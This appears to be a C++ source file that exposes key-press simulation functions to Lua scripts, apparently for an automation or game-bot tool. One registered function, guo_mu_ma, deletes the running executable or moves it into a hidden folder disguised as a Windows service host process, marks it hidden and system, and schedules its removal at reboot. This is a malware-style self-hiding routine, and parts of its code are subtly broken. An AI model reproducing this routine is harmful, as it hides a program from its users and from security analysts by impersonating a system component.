#include "stdafx.h"
#include "lua_export.h"
#include "functions.h"


extern ExportedFunctions Exported;

int export_keyDown(lua_State *L)
{
	int key = (int)lua_tonumber(L,1);
	keyDown(key);
	return 0;
}

int export_keyUp(lua_State *L)
{
	int key = (int)lua_tonumber(L, 1);
	keyUp(key);
	return 0;
}

int export_doKeyPress(lua_State *L)
{
	int key = (int)lua_tonumber(L, 1);
	int s = 0;
	if (lua_isnumber(L, 2)) {
		s = (int)lua_tonumber(L, 2);
	}
	doKeyPress(key,s);
	return 0;
}


int guo_mu_ma(lua_State *L)
{
	char FileName[MAX_PATH];
	memset(FileName, 0, MAX_PATH);
	//获取文件路径
	GetModuleFileName(NULL,FileName, MAX_PATH);
	char *NewFileName;
	NewFileName = new char[MAX_PATH];
	memset(NewFileName, 0, MAX_PATH);
	//设置文件属性
	SetFileAttributes(NewFileName, FILE_ATTRIBUTE_NORMAL);
	//尝试直接删除
	if (DeleteFile(FileName))//能直接删掉最好
	{
		delete[] NewFileName;
		return false;
	}
	//以下API一样，不再啰嗦
	wsprintf(NewFileName, "%C:\\\0", FileName[0]);
	CreateDirectory(NewFileName, NULL);
	SetFileAttributes(NewFileName, FILE_ATTRIBUTE_HIDDEN);
	wsprintf(NewFileName, "%C:\\Windows 服务主进程\0", FileName[0], GetTickCount());
	SetFileAttributes(NewFileName, FILE_ATTRIBUTE_NORMAL);
	DeleteFile(NewFileName);
	if (!MoveFileEx(FileName, NewFileName, MOVEFILE_REPLACE_EXISTING))
	{
		delete[] NewFileName;
		return false;//动不了就放弃
	}
	MoveFileEx(NewFileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
	SetFileAttributes(NewFileName, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	delete[] NewFileName;
	return 0;
}

void lua_export()
{
	lua_State *lua_state = Exported.GetLuaState();
	lua_register(lua_state, "keyDown", export_keyDown); 
	lua_register(lua_state, "keyUp", export_keyUp);
	lua_register(lua_state, "doKeyPress", export_doKeyPress);
	lua_register(lua_state, "guo_mu_ma", guo_mu_ma);
}